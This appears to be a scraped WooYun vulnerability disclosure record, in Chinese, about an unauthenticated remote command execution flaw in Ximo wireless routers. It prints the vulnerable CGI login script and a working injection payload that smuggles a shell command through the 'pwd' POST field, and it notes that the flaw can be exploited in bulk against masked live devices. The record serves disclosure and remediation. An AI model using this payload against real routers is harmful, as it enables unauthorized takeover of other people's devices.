{"id": 87062, "wybug_id": "wooyun-2016-0176844", "wybug_title": "西默科技智能无线路由多个设备远程命令执行（无需登录可批量）", "wybug_corp": "上海西默通信技术有限公司", "wybug_author": "路人甲", "wybug_date": "2016-02-19 10:31", "wybug_open_date": "2016-05-23 16:00", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-26：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-23：\t细节向公众公开  简要描述： 西默科技智能无线路由多个设备远程命令执行（无需登录可批量） 详细说明：  该漏洞影响西默科技多个型号的无线路由，包括但不限于XMSWR-W16、XMSWR-W18M、XMSWR-W15该系统的登录密码处存在任意命令执行漏洞\n/cgi-bin/checkpa post参数：pwd\n该/cgi-bin/checkpa的部份漏洞代码为：\n#!/bin/shprintf \"content-type:text/html;cache-control:no-cache\"if [ \"${REQUEST_METHOD}\" = \"POST\" ]; then\teval $(cat |sed -e \"s/&.x=.*//\" | awk -F'&' '{for(i=1;i<=NF;i++){print $i}}')\tlocalpass=`cat /mnt/htpasswd`\tpwd=`/sbin/asciidecode ${pwd}`\tif [ \"${pwd}\" = \"${localpass}\" ]; then\t\techo \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=/cgi-bin/setCookie\\\" />\";\telse\t\techo \"<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html;charset=utf-8\\\" />\";\t\techo -n \"<script>alert('密码错误！');top.window.location.href='/login.htm';</script>\"\tfi\texit 0fi\n注意到这里：/sbin/asciidecode ${pwd}用户提交的参数pwd直接当作命令的一部分执行了，于是造成了命令执行我们只要POST提交下面的代码，即可执行任意的命令:\npwd=wooyun;ifconfig>/etc_ro/web/wooyun.txt\n   漏洞证明：  该系统大量使用，选取个别做漏洞证明0x1 **.**.**.**/login.htm（XMSWR-W18M）\n**.**.**.**/wooyun.txt\n\n\n0x2 **.**.**.**/login.htm（XMSWR-W15）\n**.**.**.**/wooyun.txt\n\n\n再给出几个案例\n**.**.**.**/login.htm  XMSWR-W15**.**.**.**/login.htm XMSWR-W18M**.**.**.**/login.htm XMSWR-W18M**.**.**.**/login.htm XMSWR-W18M**.**.**.**/home.htm XMSWR-W16\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-02-23 15:54 厂商回复： 感谢 路人甲 发现问题并反馈，公司研发团队已确认该漏洞并予以紧急处理，谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}